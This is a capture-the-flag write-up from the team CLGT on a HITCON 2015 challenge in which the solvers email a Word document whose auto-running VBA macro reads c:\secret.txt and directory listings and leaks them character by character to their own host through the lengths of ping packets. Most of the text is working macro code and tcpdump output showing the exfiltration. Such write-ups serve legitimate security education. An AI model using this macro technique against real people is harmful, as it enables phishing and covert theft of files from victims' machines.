We made it to top 10, Team CLGT !

Description:

>Sent me a .doc, I will open it if your subject is "HITCON 2015"! Find the flag under my file system. p.s. I've enabled Macro for you. ^_________________^ phishing.me.hitcon.2015@gmail.com.
>
>Hint


From the information, we know this challenge is all about macro. Requirement will be,

- MS Windows
- Ms Word with Macro
- Email with subject "HITCON 2015"
- RCPT TO: phishing.me.hitcon.2015@gmail.com

Once all this condition is fulfilled. We received an confirmation email from HITCON
> I've read your doc. Interesting

First guess was, ping to home
> Shell ("ping -n 1 my.ip.add.ress")

TCPDUMP from home with ICMP on. Bingo, packet received. We went and wrote few more connection script like email and web. Looks like we got no luck at all. So we concluded,

- No Outgoing TCP Allowed (** ppp solved it with DNS Query)

Looks like ICMP able to to go out from the box. So, we did another test.

> Shell ("ping -n 1 -l 2 my.ip.add.ress")

And we received

> 11:29:43.643405 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2249, length 10

This is clear that we can somehow use the length to pass some data. So, first thing is. We want to know where are we.

```
strString = (ActiveDocument.Path)
For i = 1 To Len(strString)
    strHex = Hex(Asc(Mid(strString, i, 1)))
    strDec = CLng("&h" & strHex)
    strDec = strDec - 8
    Shell ("ping -n 1 -l " & strDec & " my.ip.add.ress")
Next
```

Next From the ping with length, we convert back the Dec value back to ASCII, we got PATH Secondly, we go a "dir"

```
Set objFSO = CreateObject("Scripting.FileSystemObject")
objStartFolder = (ActiveDocument.Path)

Set objFolder = objFSO.GetFolder(objStartFolder)
'MsgBox objFolder.Path
Set colFiles = objFolder.Files
For Each objFile In colFiles

    'MsgBox objFile.Name

    strString = objFile.Name

    For i = 1 To Len(strString)
        strHex = Hex(Asc(Mid(strString, i, 1)))
        'MsgBox strHex
        strDec = CLng("&h" & strHex)
        strDec = strDec - 8
        For iCount = 1 To 1000
        Next iCount
        Shell ("ping -n 1 -l " & strDec & " my.ip.add.ress")
    Next

    Shell ("ping -n 1 -l 34 my.ip.add.ress")
Next
```

Nothing seems to me interesting. So we change and code a little bit and do a dir on "C:\", we found secret.txt !!! Another peace of code to show what is in secret.txt

```
Sub AutoOpen()

Dim MyString As String

'Open the text file
'(replace "MyTextFile.txt" with the name of your file)
Open "c:\secret.txt" For Input As #1

'loop through the file until the end of file marker
'is reached
Do While Not EOF(1)
    'read line of text, place it in the MyString variable
    Line Input #1, MyString
     'MsgBox (MyString)
    'you can then use whatever is in MyString for
    'your formatting purposes
Loop

'close the text file
Close #1

    strString = MyString
    'strString = "ABCD"

    For i = 1 To Len(strString)
        strHex = Hex(Asc(Mid(strString, i, 1)))
        'MsgBox strHex
        strDec = CLng("&h" & strHex)
        strDec = strDec - 8

        For iCount = 1 To 10000000
        Next iCount
        'MsgBox (strHex & " " & strDec)
        Shell ("ping -n 1 -l " & strDec & " my.ip.add.ress")
    Next


End Sub
```

From TCPDUMP we received
```
11:29:41.058538 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2215, length 104
11:29:41.058617 IP my.ip.add.ress > 54.92.10.249: ICMP echo reply, id 1, seq 2215, length 104 11:29:41.128465 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2216, length 105
11:29:41.128542 IP my.ip.add.ress > 54.92.10.249: ICMP echo reply, id 1, seq 2216, length 105
11:29:41.202369 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2217, length 116
11:29:41.202441 IP my.ip.add.ress > 54.92.10.249: ICMP echo reply, id 1, seq 2217, length 116
--- More ICMP Traffic ---
11:29:44.321431 IP 54.92.10.249 > my.ip.add.ress: ICMP echo request, id 1, seq 2258, length 125
11:29:44.321527 IP my.ip.add.ress > 54.92.10.249: ICMP echo reply, id 1, seq 2258, length 125
```

By taking all the length, we got the string as

> hitcon{m4cr0_ma1ware_1s_m4k1ng_a_c0meb4ck!!}

Done !!!

Special thanks to k9 from CLGT
